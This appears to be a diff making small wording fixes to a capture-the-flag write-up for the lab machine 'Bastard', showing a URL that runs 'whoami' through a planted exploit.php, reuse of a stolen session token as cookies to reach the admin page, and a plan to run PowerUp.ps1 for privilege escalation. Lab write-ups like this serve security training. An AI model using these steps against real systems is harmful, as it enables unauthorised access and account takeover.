@@ -92,13 +92,13 @@ http://10.10.10.9/exploit.php?exec=whoami
 
 It outputs that we are _NT Authority\iusr_.
 
-Now that we either have command execution with this method or we can use the token in the file _session.json_ and replace our cookies with these values and we are logged in as Admin:
+Now we either have command execution with this method or we can use the token in the file _session.json_ and replace our cookies with these values and we are logged in as Admin:
 
 ![Admin page](https://kyuu-ji.github.io/htb-write-up/bastard/bastard_adminpage.png)
 
 ### Command Execution on HTTP
 
-We should can run any enumeration script on this box to get an attack surface. I will run _PowerUP.ps1_ from the **Powersploit Framework** first.
+We should run any enumeration script on this box to get an attack surface. I will run _PowerUP.ps1_ from the **Powersploit Framework** first.
 
 Download the file from your local machine and run it:
 ```markdown
